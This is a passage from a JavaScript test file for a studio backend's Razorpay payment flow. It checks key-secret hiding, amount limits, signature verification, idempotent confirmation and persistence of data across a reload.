  assert.equal(state(s, 'client').online.enabled, false);
  refused(s.b.call('client.createOnlineOrder', { amount: '500' }, s.client), /not set up yet/);

  const secret = 'test_secret';
  let captured = true;
  const g = studio({
    props: { RAZORPAY_KEY_ID: 'rzp_test_key', RAZORPAY_KEY_SECRET: secret },
    fetch: (url, opts) => {
      const body = url.endsWith('/orders') ? { id: 'order_T1', amount: JSON.parse(opts.payload).amount } : { order_id: 'order_T1', status: captured ? 'captured' : 'failed', amount: 50000 };
      return { getResponseCode: () => 200, getContentText: () => JSON.stringify(body) };
    }
  });
  addVideo(g);
  const st = state(g, 'client');
  assert.deepEqual([st.online.enabled, st.online.keyId], [true, 'rzp_test_key']);
  assert.ok(!JSON.stringify(st).includes(secret) && !JSON.stringify(state(g, 'admin')).includes(secret));
  refused(g.b.call('client.createOnlineOrder', { amount: '9999' }, g.client), /cannot be more than/);
  const order = ok(g.b.call('client.createOnlineOrder', { amount: '500' }, g.client));
  const sign = id => crypto.createHmac('sha256', secret).update(order.orderId + '|' + id).digest('hex');
  refused(g.b.call('client.verifyOnlinePayment', { orderId: order.orderId, paymentId: 'pay_1', signature: 'forged' }, g.client), /could not be verified/);
  captured = false;
  refused(g.b.call('client.verifyOnlinePayment', { orderId: order.orderId, paymentId: 'pay_1', signature: sign('pay_1') }, g.client), /not confirmed/);
  assert.equal(state(g, 'client').ledger.paid, 0);
  captured = true;
  ok(g.b.call('client.verifyOnlinePayment', { orderId: order.orderId, paymentId: 'pay_1', signature: sign('pay_1') }, g.client));
  ok(g.b.call('client.verifyOnlinePayment', { orderId: order.orderId, paymentId: 'pay_1', signature: sign('pay_1') }, g.client)); // repeat is harmless
  assert.deepEqual([state(g, 'client').ledger.paid, g.b.rows('ClientPayments').length], [500, 1]);
});

test('data survives a reload of the backend (same sheets, new execution)', () => {
  const s = studio();
  const v = addVideo(s);
  const again = createBackend({ quiet: true, data: JSON.parse(JSON.stringify(s.b.dump())) });
  again.setup(); // running setup again changes nothing
  const st = ok(again.call('state', {}, s.client));
  assert.deepEqual(st.videos.map(x => x.id), [v.id]);
  assert.equal(st.pricings.find(p => p.type === 'REEL').price, 1500);
});
